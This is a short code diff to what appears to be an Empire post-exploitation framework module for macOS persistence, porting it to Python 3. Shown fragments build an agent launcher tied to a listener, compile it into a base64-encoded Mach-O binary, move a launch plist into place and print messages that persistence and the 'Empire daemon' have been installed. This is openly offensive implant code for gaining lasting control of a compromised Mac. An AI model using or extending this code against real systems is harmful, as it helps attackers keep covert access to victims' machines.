@@ -93,7 +93,7 @@ class Module(object):
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
-        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
+        launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
         machoBytes = self.mainMenu.stagers.generate_macho(launcherCode=launcher)
         encBytes = base64.b64encode(machoBytes)
 
@@ -153,8 +153,8 @@ process.communicate()
 process = subprocess.Popen('mv /tmp/%(plistFilename)s '+launchPath+'%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-print "\\n[+] Persistence has been installed: "+launchPath+"%(plistFilename)s"
-print "\\n[+] Empire daemon has been written to "+daemonPath+"%(programName)s"
+print("\\n[+] Persistence has been installed: "+launchPath+"%(plistFilename)s")
+print("\\n[+] Empire daemon has been written to "+daemonPath+"%(programName)s")
 
 """ % {"encBytes":encBytes, "plistSettings":plistSettings, "daemonName":daemonName, "programName":programName, "plistFilename":plistFilename}
 
